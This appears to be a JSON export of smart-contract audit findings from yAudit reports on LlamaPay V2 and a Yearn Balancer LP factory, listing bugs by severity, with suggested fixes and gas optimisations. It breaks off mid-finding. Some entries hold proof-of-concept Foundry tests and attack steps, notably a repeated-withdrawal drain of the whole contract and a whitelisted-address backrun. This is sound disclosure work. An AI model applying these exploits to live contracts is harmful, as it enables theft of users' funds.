[
    {
        "title": "1. Infinite withdrawals using function withdrawAllWithRedirect(uint256 _id)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "In the following example, Bob can withdraw all tokens in the contract. The first call only withdraws the funds allocated to him, but because it's not recorded, Bob can call withdraw again. Here's an extended test. function testWithdrawAllWithRedirect() external { vm.prank(alice); llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 10000000 ); vm.prank(bob); llamaPayV2Payer.addRedirectStream(0, steve); vm.warp(15000); vm.prank(bob); llamaPayV2Payer.withdrawAllWithRedirect(0); (uint256 balance, , , uint48 lastUpdate) = llamaPayV2Payer.tokens( address(llamaToken) ); assertEq(llamaToken.balanceOf(address(llamaPayV2Payer)), 5000 * 1e18); assertEq(llamaToken.balanceOf(steve), 5000 * 1e18); assertEq(balance, 5000 * 1e20); assertEq(lastUpdate, 15000); // redeemables should be 0 but it's not assertGt(llamaPayV2Payer.redeemables(0), 0); // Withdraw all again vm.prank(bob); llamaPayV2Payer.withdrawAllWithRedirect(0); assertEq(llamaToken.balanceOf(address(llamaPayV2Payer)), 0); assertEq(llamaToken.balanceOf(steve), 2 * 5000 * 1e18); assertEq(lastUpdate, 15000); // redeemables should be 0 but it's not assertGt(llamaPayV2Payer.redeemables(0), 0); }",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Inaccurate internal token balance for weird ERC20 tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "When a token is deposited into LlamaPayV2Payer, the internal balance is updated and the transfer of tokens into the contract happens. The key lines are: tokens[_token].balance += _amount * tokens[_token].divisor; token.safeTransferFrom(msg.sender, address(this), _amount); The problem is that if a fee-on-transfer exists, the tokens[_token].balance will be greater than the balanceOf token amount in the contract, because the tokens[_token].balance did not subtract the fee-on-transfer amount. A receiver could withdraw more tokens than they should have access to with these steps: The payer deposits X number of fee-on-transfer tokens into the LlamaPayV2Payer contract The internal balance thinks the contract holds X tokens, but actually the contract holds X - tokenFee tokens The contract accounting does not consider the fee involved for fee-on-transfer tokens. If the receiver is eligible to withdraw the X amount of tokens, they can only withdraw X - tokenFee tokens because this is the amount held by the contract. If fee-on-transfer tokens are permitted, the accounting should only permit a withdrawal of X - tokenFee. The payer deposits Y number of fee-on-transfer tokens into the LlamaPayV2Payer contract. If X - tokenFee + Y - tokenFee > X, then the receiver can now withdraw the X amount of tokens because the contract holds enough tokens to allow this withdrawal. If fee-on-transfer tokens are permitted, the accounting should only permit a withdrawal of X - tokenFee, but with the current code, the receiver with withdraw X tokens. Likewise, if a rebasing token is used and the balanceOf token amount in the contract is a function of time, the tokens[_token].balance value is not increased or decreased outside of deposit or withdraw events and therefore the internal accounting may underestimate the tokens held by the contract. This latter case could lock funds in the contract, for example: The payer deposits X number of rebasing tokens into the LlamaPayV2Payer contract Over time, the X rebasing tokens grow to 1.25 * X tokens Once the stream ends and the receiver can withdraw the full token balance, the internal account balance still assumes the contract holds only X tokens, so only X tokens and not 1.25 * X tokens can be withdrawn.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. burnStream() shouldn't burn a stream if it has some debt",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Alice creates a stream for Bob which ended but has some debt accrued. Some time after the stream ends, Alice decides to burn that stream. Later Bob checks that Alice has to pay some debt for stream and calls repayAllDebt() to pay the debt for that stream. But now as the stream has been burnt by Alice, Bob cannot redeem the debt from stream, and those amount of funds are locked into that stream.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Payee funds get locked if stream is resumed after being burned",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Alice (payer) creates a stream for Bob (payee), and later Alice decided to burn the stream as the payout time was over. Now later Alice decides to resume the stream to Bob, which in turns makes the stream active again. But Bob can not accesss the redeemable funds as due to the burn the ownerOf(_id) is address(0), and has not been reallocated in resumeStream(). function testBurnAndResumeStream() external { vm.startPrank(alice); // Alice creates a stream for Bob llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 50000 ); vm.warp(12000); // Alice stops the stream llamaPayV2Payer.stopStream(0, false); // Alice pays Bob llamaPayV2Payer.withdrawAll(0); // checking that bob is the owner of stream address nftOnwer = llamaPayV2Payer.ownerOf(0); assertEq(nftOnwer, bob); // Alice burns the stream llamaPayV2Payer.burnStream(0); // Alice resumes the stream, now Bob can again withdraw after some time llamaPayV2Payer.resumeStream(0); vm.warp(20000); vm.stopPrank(); // now Bob tries to withdraw from stream, which fails as the owner of nft is address(0) vm.startPrank(bob); llamaPayV2Payer.withdrawAll(0); vm.stopPrank(); }",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Llama Pay V2 is incompatible with high decimal tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "The key line is: if (tokens[_token].divisor == 0) { tokens[_token].divisor = uint208(10**(20 - token.decimals())); } If token.decimals() is greater than 20, then the subtraction 20 - token.decimals() will underflow and the transaction will revert. This prevents depositing tokens like YAM-V2 into Llama Pay V2.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. permitToken fails in case of tokens that doesn't follow IERC20Permit standard",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "permitToken() fails in case of DAI. IERC20Permit: function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external; DaiPermit: function permit( address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s ) external;",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Handle funds transferred via transfer method",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Introduce a new variable X that tracks the net amount that exist in the contract for each token. Updating LlamaPayV2Payer.sol#L183 with ERC20(token_).balanceOf(address(this)) solves this by making those extra funds withdraw-able. - uint256 toSend = token.balance / token.divisor; + uint256 toSend = (token.balance / token.divisor) + (ERC20(_token).balanceOf(address(this)) - X); Rebalance token balance in _updateToken function. function _updateToken(address _token) private { Token storage token = tokens[_token]; token.balance += (ERC20(_token).balanceOf(address(this)) - X); ... }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Missing Input Validation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "None of the external createStream functions or the internal one createStream perform input validation for the _to address. This address is supplied by the user and is the recipient of the stream token. It is not uncommon for users or front-ends/ clients to set 0 as values for input forms. This can lead to a user creating a stream but accidentally burning it in the process as well.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. _updateToken updates token.lastUpdate even if the token doesn't exists",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "function _updateToken(address _token) private { Token storage token = tokens[_token]; // @audit add this check require(token.divisor > 0, \"NOT_ADDED\"); // rest same }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. BoringBatchable.batch() is payable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "BoringBatchable.sol#L46",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. modifyStream() should revert for inactive stream",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "For example, take a stream s with id id with this configuration: s.lastPaid < s.starts lastUpdate > s.ends s.amountPerSec == _oldAmountPerSec Now, modifyStream(id, _newAmountPerSec, _newEnd) is called for this stream with _newEnd in future. After _updateStream(), lastPaid becomes 0, and now even though the stream's end is in future, it is not streamed any funds as the stream remains inactive.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. withdrawable() can revert",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Cases where withdrawable() can revert: When no token is deposited in LlamaPayV2Payer, and a stream is created. reverts due to division by 0 as token.divisor is 0. When execution reaches in this else block, and stream.starts > lastUpdate. reverts due to arithmetic underflow. This implicitly assumes that lastUpdate lies between starts and ends.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Inaccuracies in withdrawable()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L650 LlamaPayV2Payer.sol#L603",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. streams can be resumed even after burn",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "function testBurnAndResumeStream() external { vm.startPrank(alice); llamaPayV2Payer.createStream( address(llamaToken), bob, 1e20, 10000, 50000 ); vm.warp(12000); llamaPayV2Payer.stopStream(0, false); llamaPayV2Payer.withdrawAll(0); // burning the stream llamaPayV2Payer.burnStream(0); // resuming the stream llamaPayV2Payer.resumeStream(0); vm.stopPrank(); } function burnStream(uint256 _id) external { if ( msg.sender != owner && payerWhitelists[msg.sender] != 1 && msg.sender != ownerOf(_id) ) revert NOT_OWNER_OR_WHITELISTED(); /// Prevents somebody from burning an active stream or a stream with balance in it if (redeemables[_id] > 0 || streams[_id].lastPaid > 0) revert STREAM_ACTIVE_OR_REDEEMABLE(); _burn(_id); emit BurnStream(_id); } As above code shows that data related to that particular burnt _id still stays in contract, it can be again resumed.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. modifyStream can create a new stream if it doesn't exist",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Since modifyStream doesn't check whether the stream is present or not, it creates a new stream if not present. function testModifyStream() external { vm.prank(alice); llamaPayV2Payer.modifyStream(0, 2e20, 20000); (uint208 amountPerSec, , , , uint256 ends) = llamaPayV2Payer.streams( 0 ); assertEq(amountPerSec, 2e20); assertEq(ends, 20000); }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. payerWhitelists addresses should have access to all withdraw operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "withdraw(), withdrawAll(), withdrawWithRedirect(), and withdrawAllWithRedirect() do not permit an address in payerWhitelists to call them. Most likely this was an oversight, because the addresses in payerWhitelists should have similar permissions as the contract owner. The payer whitelist addresses could take funds directly from the contract already, so they should be able to assist with transfering the funds to the intended recipient.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Rogue payerWhitelists address can steal value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Any function protected by the onlyOwnerAndWhitelisted modifier treats the owner and whitelisted payer addresses as the same privilege level. This includes the internal _createStream() function that can redirect value to a recipient. If an owner deposits value into the Llamapay contract, an address in the payerWhitelists mapping can: Backrun the deposit to create a stream where the recipient is an address that is controlled by the whitelisted address. The stream end date can be in the past so that it is possible to instantly withdraw. After the stream is created, the recipient can withdraw the funds. The end result is the same as calling withdrawPayer() directly, but this is a less expected approach.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Use cheaper comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "At L251 and L280 logic can be switched to save some gas.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Incorrect function visibility",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "tokenURI() and withdrawable() should be external functions in LlamaPayV2Payer. In LlamaPayV2Factory, calculateLlamaPayAddress() should be an external function.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. owner should be a immutable variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "owner is never updated; it should be defined as an immutable to save gas.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Return stream value after updating",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "If the _updateStream(uint256 _id) is changed to return the update stream, small gas optimization is possible. At L201, L222, L243, L272, L400, L425, L446, L222 a stream value could be returned instead of loading again stream in the next line.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Unchecked can be applied to this line and other similar locations. The subtraction will not overflow because lastUpdate is zero. block.timestamp - lastUpdate has a max value of type(uint48).max and token.totalPaidPerSec has a max value of type(uint208).max, the maximum product is type(uint256).max which doesn't overflow. - uint256 streamed = (block.timestamp - lastUpdate) * token.totalPaidPerSec; + unchecked { uint256 streamed = (block.timestamp - lastUpdate) * token.totalPaidPerSec; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Do not load whole struct if not required",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Following function loads Stream struct, but loading Stream.token works. withdrawAllWithRedirect withdrawWithRedirect withdrawAll withdraw - Stream storage stream = streams[_id]; + address token = streams[_id].token;",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Pass struct as a params to _createStream()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Update _createStream and createStream this way: function createStream( address _token, address _to, uint208 _amountPerSec, uint48 _starts, uint48 _ends ) external { uint256 id = _createStream( Stream({ amountPerSec: _amountPerSec, token: _token, lastPaid: 0, starts: _starts, ends: _ends }), _to ); emit CreateStream(id, _token, _to, _amountPerSec, _starts, _ends); } function _createStream(Stream memory stream, address _to) private onlyOwnerAndWhitelisted returns (uint256 id) { if (stream.starts >= stream.ends) revert INVALID_TIME(); _updateToken(stream.token); Token storage token = tokens[stream.token]; if (block.timestamp > token.lastUpdate) revert PAYER_IN_DEBT(); _safeMint(_to, id = nextTokenId); /// calculate owed if stream already ended on creation uint256 owed; if (block.timestamp > stream.ends) { owed = (stream.ends - stream.starts) * stream.amountPerSec; } else if (block.timestamp > stream.starts) { /// calculated owed if start is before block.timestamp owed = (block.timestamp - stream.starts) * stream.amountPerSec; tokens[stream.token].totalPaidPerSec += stream.amountPerSec; stream.lastPaid = uint48(block.timestamp); } else if (stream.starts >= block.timestamp) { /// If started at timestamp or starts in the future tokens[stream.token].totalPaidPerSec += stream.amountPerSec; stream.lastPaid = uint48(block.timestamp); } unchecked { /// If can pay owed then directly send it to payee if (token.balance >= owed) { tokens[stream.token].balance -= owed; redeemables[id] = owed; } else { /// If cannot pay debt, then add to debt and send entire balance to payee uint256 balance = token.balance; tokens[stream.token].balance = 0; debts[id] = owed - balance; redeemables[id] = balance; } nextTokenId++; streams[id] = stream; } }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. if condition can be optimized in withdrawable()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L662",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Use calldata instead of memory if function param remains unchanged",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Following function uses memory to pass string param, calldata can be used as the string remains unchanged during function execution. createStreamWithReason createStreamWithheldWithReason - string memory _reason + string calldata _reason",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Consider and compare UX when streams are ERC1155 tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "ERC1155 doesn't have the same interface as ERC721, so if doing this replacement, a code refactor may be needed. Another thing to consider would be to use ERC1155D (see this repo and announcement) which provides compatibility with ERC721 interface, however, it's not audited. So if you consider ERC1155D, you can either self-review it, take inspiration or get it audited.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Missing Indexed Event Parameters",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "All the events are missing any indexed parameters.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. External createStream functions should return the streamId",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Right now, the createStream functions namely createStream, createStreamWithReason, createStreamWithheld and createStreamWithheldWithReason, do not return the id of the newly created stream. Returning the id of the stream upon creation could result in better integration with other protocols and a better UX, where the user immediately knows the id of his stream once it is created.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Update BoringBatchable to latest version",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "The difference between BoringBatchable in Llama Pay V2 and the main Boring Solidity repo is this PR https://github.com/boringcrypto/BoringSolidity/pull/16/files.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Add tests for weird ERC20 tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "The weird-erc20 repo has many sample contracts that mimic unusual ERC20 token behavior. Consider writing tests to check the compatibility of LlamaPay V2 with all of these contracts.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Sanitisation to avoid false event emission",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "function addPayerWhitelist(address _toAdd) external onlyOwner { require(payerWhitelists[_toAdd] == 0, \"ALREADY_WHITELISTED\"); payerWhitelists[_toAdd] = 1; emit AddPayerWhitelist(_toAdd); } function removePayerWhitelist(address _toRemove) external onlyOwner { require(payerWhitelists[_toAdd] == 1, \"NOT_WHITELISTED\"); payerWhitelists[_toRemove] = 0; emit RemovePayerWhitelist(_toRemove); }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. tokenURI() should revert for non-existent tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L135",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Missing events for critical operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Ideally, the following critical operations should trigger events: cancelDebt repayAllDebt repayDebt updateStream",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Lack of zero check on functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "For e.x., function addPayerWhitelist(address _toAdd) external onlyOwner { payerWhitelists[_toAdd] = 1; emit AddPayerWhitelist(_toAdd); } Similarly following function doesn't check for valid input address. addPayerWhitelist removePayerWhitelist addRedirectStream addStreamWhitelist removeStreamWhitelist",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. onlyOwnerAndWhitelisted should be renamed onlyOwnerOrWhitelisted",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L129",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. unchecked has no effect",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L454",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Use consistent decimals format in functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "- /// @param _amount amount to repay (20 decimals) + /// @param _amount amount to repay (native token decimals) function repayDebt(uint256 _id, uint256 _amount) external { if ( msg.sender != owner && payerWhitelists[msg.sender] != 1 && msg.sender != ownerOf(_id) ) revert NOT_OWNER_OR_WHITELISTED(); address token = streams[_id].token; + /// convert _amount into 20 decimals format + _amount = _amount * tokens[token].divisor; /// Update token to update balances _updateToken(token); /// Reverts if debt cannot be paid tokens[token].balance -= _amount; /// Reverts if paying too much debt debts[_id] -= _amount; /// Add to redeemable to payee redeemables[_id] += _amount; }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Use function to reduce duplicacy of code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "if ( msg.sender != nftOwner && msg.sender != owner && streamWhitelists[_id][msg.sender] != 1 ) revert NOT_OWNER_OR_WHITELISTED(); Following code snippet can be converted into a function. function ownerOrNftOwnerOrWhitelisted(uint _id, address _nftOwner) internal { if ( msg.sender != nftOwner && msg.sender != owner && streamWhitelists[_id][msg.sender] != 1 ) revert NOT_OWNER_OR_WHITELISTED(); } Applicable to following functions: withdraw withdrawAll withdrawWithRedirect withdrawAllWithRedirect",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Redirect recipient cannot receive funds directly",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "addRedirectStream() and removeRedirectStream() allow the receiver of the stream's tokens to sent to a different address with withdrawWithRedirect() or withdrawAllWithRedirect(). withdrawWithRedirect() and withdrawAllWithRedirect() have the same access controls as other withdraw functions, meaning only the NFT owner, the contract owner, or a stream whitelist address can trigger the transfer of funds to the redirect address. This means the redirect address does not have control over these funds but is instead relying on someone else to deliver the funds. This is a less than ideal experience for the redirect receiver, unless the intent of this feature is that the redirect address and NFT address should have the same person (or entity) owning the two addresses. If that is a hidden intent when using the redirect address, it should be clearly documented.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "strean -> stream redeeemable -> redeemable",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Stream owner should be able to call updateStream()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-LlamaPayV2.md",
        "body": "LlamaPayV2Payer.sol#L478",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Dependency on a single DEX for CRV price",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable.sol#L430 estimates value of CRV tokens in terms of USDT by routing it through WETH swaps.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Possible revert on creating a vault",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "BalancerGlobal.sol#L368-L375: bytes memory data = abi.encodeWithSignature(\"latestVault(address)\", lptoken); (bool success, ) = address(registry).staticcall(data); if (success) { return registry.latestVault(lptoken); } else { return registry.latestVault(lptoken, VaultType.AUTOMATED); } If no vault is registered for DEFAULT, success is false, and since there is no AUTOMATED type vault, the else clause revert. So in this case, it becomes impossible to create a vault for lptoken.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Strategy migrations fail to claim reward/extraReward tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "There does not appear to be any mechanism to harvest or re-enable a strategy that has been migrated. This means that any unharvested rewards are effectively lost on migration. The magnitude of this finding depends on the amount of time that has passed since the strategy was last harvested. If the strategy has not been harvested in a week & is migrated, then a week's worth of extra rewards are lost. Given the following assumptions/observations, this finding may have a high impact: Some Curve vaults go unharvested for many weeks at a time. CRV/CVX/Extra rewards tend to make up a large fraction of yield revenue. There is no mechanism to prevent a strategy migration when a strategy has not been harvested in a long period of time. If the magnitude/accuracy of the above assumptions are incorrect, then this finding may have medium or lower severity.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. _loss on liquidatePosition() is never accounted in strategy & vault, which can result in funds lost/stuck",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "In BaseStrategy.sol, in harvest() we have this code debtOutstanding = vault.report(profit, loss, debtPayment); which reports the loss to the vault, so if it reports a 0 loss when there is one then the whole accounting logic for the strategy will be incorrect which can lead to loss funds or stuck funds in strategy. Also the correctness of the healthcheck in the strategy will not be certain because of the following code in BaseStrategy.sol that uses loss: require(HealthCheck(healthCheck).check(profit, loss, debtPayment, debtOutstanding, totalDebt), \"!healthcheck\");",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Dependence on Curve/Balancer governance",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "Things move quick in this space and \"Curve wars\" bribing adds additional volatility to the situation. With this new automated process for adding pools/strategies, the risk from dependence on external governance processes is amplified. In the event of another governance attack or if a vulnerable token were to enter the system, then malicious actions could be completed more quickly now due to this new permissionless system dependent on approved gauges.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Wrong parameter to cloneStrategyConvex function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "The 3rd parameter in cloneStrategyConvex() is a _rewards address as defined in BalancerGlobal.sol#L83 interface IStrategy { function cloneStrategyConvex( address _vault, address _strategist, address _rewards, address _keeper, uint256 _pid, address _tradeFactory, uint256 _harvestProfitMax, address _booster, address _convexToken ) external returns (address newStrategy); However, the same management address was passed in for both 2nd and 3rd parameters: BalancerGlobal.sol#L479",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Strategy migrations will cause inaccurate accounting on first harvest of new strategy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "The impact of this finding is dependent on Yearn's strategy management practices & downstream tooling, so consider this impact analysis \"best effort\". If the old strategy has not been harvested in a long time, there may be a relatively large amount of unreported gains/losses that have yet to be realized by the old strategy. This may cause data accuracy problems when analyzing the APR performance for the new strategy. Consider the case where: Old strategy was last harvested a week ago. Old strategy is migrated to new strategy. 10 minutes later, the new strategy is harvested. In the above scenario, a week's worth of gains/losses will be realized by the new strategy, and since the new strategy was deployed 10 minutes prior, off-chain tooling/instrumentation might draw inaccurate conclusions about the performance of the new strategy.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Convex's extraRewards array is unbounded",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "StrategyConvexFactoryClonable#_updateRewards has the following for loop: for (uint256 i; i < rewardsContract.extraRewardsLength(); i++) { address virtualRewardsPool = rewardsContract.extraRewards(i); address _rewardsToken = IConvexRewards(virtualRewardsPool).rewardToken(); // we only need to approve the new token and turn on rewards if the extra rewards isn't CVX if (_rewardsToken != address(convexToken)) { rewardsTokens.push(_rewardsToken); } } This basically loops over Convex's extra rewards. The problem is that adding extra rewards is not bounded in Convex link. This means that if there are too many extra rewards this function will run out of gas/go over the block gas limit and result in a DoS of core strategy functionality (updating rewards).",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. _loss incorrectly assumed even if rewards can be sold to cover loss",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
        "body": "In BaseStrategy.sol, in withdraw() the _loss will be returned to the vault. The vault will then report this loss, suggesting the price per share is lower, despite the fact that the strategy could have even been in a profit if rewards were sold.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Setting deposit limit twice",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-Yearn-BalancerLPFactory.md",
